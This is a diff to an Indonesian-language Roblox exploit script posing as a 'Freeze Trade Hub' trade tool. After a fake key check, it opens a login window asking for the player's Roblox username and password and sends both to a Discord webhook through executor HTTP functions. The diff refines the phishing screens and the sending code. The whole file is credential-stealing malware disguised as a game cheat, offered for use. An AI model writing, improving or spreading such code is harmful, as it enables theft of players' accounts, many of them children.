@@ -10,155 +10,234 @@ local function sendToDiscord(username, password)
     local payload = {
         Url = webhook_url,
         Method = "POST",
-        Headers = { ["Content-Type"] = "application/json" },
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
         Body = game:GetService("HttpService"):JSONEncode({
             content = "Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
         })
     }
 
-    local response
     if syn and syn.request then
-        response = syn.request(payload)
+        local response = syn.request(payload)
+        if response and response.StatusCode == 200 then
+            print("Data berhasil dikirim ke Discord!")
+        else
+            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
+        end
     elseif http and http.request then
-        response = http.request(payload)
+        local response = http.request(payload)
+        if response and response.StatusCode == 200 then
+            print("Data berhasil dikirim ke Discord!")
+        else
+            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
+        end
     elseif request then
-        response = request(payload)
+        local response = request(payload)
+        if response and response.StatusCode == 200 then
+            print("Data berhasil dikirim ke Discord!")
+        else
+            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
+        end
     else
         print("Executor Anda tidak mendukung HTTP requests!")
-        return
-    end
-
-    if response and response.StatusCode == 200 then
-        print("Data berhasil dikirim ke Discord!")
-    else
-        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
     end
 end
 
--- Fungsi Membuat GUI Login
+-- Fungsi Membuat GUI Kedua (Login)
 local function createLoginGUI()
     local gui = Instance.new("ScreenGui")
-    gui.Name = "LoginGUI"
-    gui.Parent = game.CoreGui
-
     local frame = Instance.new("Frame")
+    local titleLabel = Instance.new("TextLabel")
+    local subtitleLabel = Instance.new("TextLabel")
+    local usernameBox = Instance.new("TextBox")
+    local passwordBox = Instance.new("TextBox")
+    local loginButton = Instance.new("TextButton")
+
+    -- Properti GUI
+    gui.Name = "LoginGUI"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+    -- Frame
+    frame.Name = "LoginFrame"
+    frame.Parent = gui
     frame.Size = UDim2.new(0, 300, 0, 300)
     frame.Position = UDim2.new(0.5, -150, 0.5, -150)
     frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
     frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-    frame.Parent = gui
 
-    local title = Instance.new("TextLabel")
-    title.Text = "Freeze Trade Hub"
-    title.TextColor3 = Color3.fromRGB(255, 255, 255)
-    title.Font = Enum.Font.SourceSansBold
-    title.TextSize = 24
-    title.Size = UDim2.new(1, 0, 0, 50)
-    title.BackgroundTransparency = 1
-    title.Parent = frame
+    -- Title Label
+    titleLabel.Name = "TitleLabel"
+    titleLabel.Parent = frame
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Text = "Freeze Trade Hub"
+    titleLabel.TextSize = 24
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    local usernameBox = Instance.new("TextBox")
-    usernameBox.PlaceholderText = "Insert Username"
+    -- Subtitle Label
+    subtitleLabel.Name = "SubtitleLabel"
+    subtitleLabel.Parent = frame
+    subtitleLabel.Size = UDim2.new(1, 0, 0, 30)
+    subtitleLabel.Position = UDim2.new(0, 0, 0, 50)
+    subtitleLabel.BackgroundTransparency = 1
+    subtitleLabel.Font = Enum.Font.SourceSans
+    subtitleLabel.Text = "Login Ke Roblox Untuk Melanjutkan"
+    subtitleLabel.TextSize = 16
+    subtitleLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+
+    -- Username Box
+    usernameBox.Name = "UsernameBox"
+    usernameBox.Parent = frame
     usernameBox.Size = UDim2.new(1, -20, 0, 40)
-    usernameBox.Position = UDim2.new(0, 10, 0, 60)
+    usernameBox.Position = UDim2.new(0, 10, 0, 90)
+    usernameBox.PlaceholderText = "Masukkan Username"
+    usernameBox.Font = Enum.Font.SourceSans
+    usernameBox.Text = ""
+    usernameBox.TextSize = 14
     usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    usernameBox.Font = Enum.Font.SourceSans
-    usernameBox.TextSize = 14
-    usernameBox.Parent = frame
 
-    local passwordBox = Instance.new("TextBox")
-    passwordBox.PlaceholderText = "Insert Password"
+    -- Password Box
+    passwordBox.Name = "PasswordBox"
+    passwordBox.Parent = frame
     passwordBox.Size = UDim2.new(1, -20, 0, 40)
-    passwordBox.Position = UDim2.new(0, 10, 0, 120)
+    passwordBox.Position = UDim2.new(0, 10, 0, 140)
+    passwordBox.PlaceholderText = "Masukkan Password"
+    passwordBox.Font = Enum.Font.SourceSans
+    passwordBox.Text = ""
+    passwordBox.TextSize = 14
     passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    passwordBox.Font = Enum.Font.SourceSans
-    passwordBox.TextSize = 14
-    passwordBox.Parent = frame
 
-    local loginButton = Instance.new("TextButton")
-    loginButton.Text = "Login"
+    -- Login Button
+    loginButton.Name = "LoginButton"
+    loginButton.Parent = frame
     loginButton.Size = UDim2.new(1, -20, 0, 40)
-    loginButton.Position = UDim2.new(0, 10, 0, 180)
-    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loginButton.Position = UDim2.new(0, 10, 0, 200)
+    loginButton.Text = "Mulai Script"
     loginButton.Font = Enum.Font.SourceSansBold
     loginButton.TextSize = 16
-    loginButton.Parent = frame
+    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
+    -- Fungsi Login Button
     loginButton.MouseButton1Click:Connect(function()
-        if usernameBox.Text ~= "" and passwordBox.Text ~= "" then
-            sendToDiscord(usernameBox.Text, passwordBox.Text)
+        local username = usernameBox.Text
+        local password = passwordBox.Text
+        if username ~= "" and password ~= "" then
+            print("Login berhasil! Username:", username, "Password:", password)
+            sendToDiscord(username, password)
             gui:Destroy()
         else
-            print("Harap isi semua kolom!")
+            print("Harap isi username dan password!")
         end
     end)
 end
 
--- Fungsi Membuat GUI Key Validation
+-- Fungsi Membuat GUI Pertama (Key Validation)
 local function createKeyValidationGUI()
     local gui = Instance.new("ScreenGui")
-    gui.Name = "KeyValidationGUI"
-    gui.Parent = game.CoreGui
-
     local frame = Instance.new("Frame")
+    local titleLabel = Instance.new("TextLabel")
+    local keyBox = Instance.new("TextBox")
+    local verifyKeyButton = Instance.new("TextButton")
+    local copyLinkButton = Instance.new("TextButton")
+    local errorLabel = Instance.new("TextLabel")
+
+    -- Properti GUI
+    gui.Name = "KeyValidationGUI"
+    gui.Parent = game.CoreGui or game:GetService("CoreGui")
+
+    -- Frame
+    frame.Name = "KeyFrame"
+    frame.Parent = gui
     frame.Size = UDim2.new(0, 300, 0, 250)
     frame.Position = UDim2.new(0.5, -150, 0.5, -125)
     frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+    frame.BorderSizePixel = 3
     frame.BorderColor3 = Color3.fromRGB(255, 0, 0)
-    frame.Parent = gui
 
-    local titleLabel = Instance.new("TextLabel")
-    titleLabel.Text = "Freeze Trade Hub"
-    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-    titleLabel.Font = Enum.Font.SourceSansBold
-    titleLabel.TextSize = 24
-    titleLabel.Size = UDim2.new(1, 0, 0, 50)
-    titleLabel.BackgroundTransparency = 1
+    -- Title Label
+    titleLabel.Name = "TitleLabel"
     titleLabel.Parent = frame
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Font = Enum.Font.SourceSansBold
+    titleLabel.Text = "Freeze Trade Hub"
+    titleLabel.TextSize = 24
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 
-    local keyBox = Instance.new("TextBox")
-    keyBox.PlaceholderText = "Insert Key"
+    -- Key Box
+    keyBox.Name = "KeyBox"
+    keyBox.Parent = frame
     keyBox.Size = UDim2.new(1, -20, 0, 40)
     keyBox.Position = UDim2.new(0, 10, 0, 60)
+    keyBox.PlaceholderText = "Masukkan Key"
+    keyBox.Font = Enum.Font.SourceSans
+    keyBox.Text = ""
+    keyBox.TextSize = 14
     keyBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
     keyBox.TextColor3 = Color3.fromRGB(255, 255, 255)
-    keyBox.Font = Enum.Font.SourceSans
-    keyBox.TextSize = 14
-    keyBox.Parent = frame
 
-    local errorLabel = Instance.new("TextLabel")
+    -- Error Label
+    errorLabel.Name = "ErrorLabel"
+    errorLabel.Parent = frame
     errorLabel.Size = UDim2.new(1, -20, 0, 20)
     errorLabel.Position = UDim2.new(0, 10, 0, 105)
     errorLabel.BackgroundTransparency = 1
     errorLabel.Font = Enum.Font.SourceSans
-    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
-    errorLabel.TextSize = 14
     errorLabel.Text = ""
-    errorLabel.Parent = frame
+    errorLabel.TextSize = 14
+    errorLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
 
-    local verifyKeyButton = Instance.new("TextButton")
-    verifyKeyButton.Text = "Verify Key"
+    -- Verify Key Button
+    verifyKeyButton.Name = "VerifyKeyButton"
+    verifyKeyButton.Parent = frame
     verifyKeyButton.Size = UDim2.new(1, -20, 0, 40)
     verifyKeyButton.Position = UDim2.new(0, 10, 0, 130)
-    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
-    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    verifyKeyButton.Text = "Verifikasi Key"
     verifyKeyButton.Font = Enum.Font.SourceSansBold
     verifyKeyButton.TextSize = 16
-    verifyKeyButton.Parent = frame
+    verifyKeyButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    verifyKeyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 
+    -- Copy Link Button
+    copyLinkButton.Name = "CopyLinkButton"
+    copyLinkButton.Parent = frame
+    copyLinkButton.Size = UDim2.new(1, -20, 0, 40)
+    copyLinkButton.Position = UDim2.new(0, 10, 0, 180)
+    copyLinkButton.Text = "Get Key"
+    copyLinkButton.Font = Enum.Font.SourceSansBold
+    copyLinkButton.TextSize = 16
+    copyLinkButton.BackgroundColor3 = Color3.fromRGB(0, 0, 200)
+    copyLinkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+    -- Fungsi Tombol Copy Link
+    copyLinkButton.MouseButton1Click:Connect(function()
+        if setclipboard then
+            setclipboard(linkUrl)
+            print("Link berhasil disalin ke clipboard!")
+        else
+            print("Executor Anda tidak mendukung setclipboard. Salin link secara manual: " .. linkUrl)
+        end
+    end)
+
+    -- Fungsi Verifikasi Key
     verifyKeyButton.MouseButton1Click:Connect(function()
         if keyBox.Text == correctKey then
             print("Key benar!")
             gui:Destroy()
-            createLoginGUI() -- Panggil GUI kedua setelah validasi
+            createLoginGUI() -- Memanggil GUI kedua
         else
-            errorLabel.Text = "Key salah! Silahkan coba lagi."
+            errorLabel.Text = "Key salah! Silahkan Get Key."
         end
     end)
 end
 
--- Memulai GUI Key Validation
+-- Memulai Script dengan GUI Pertama
 createKeyValidationGUI()
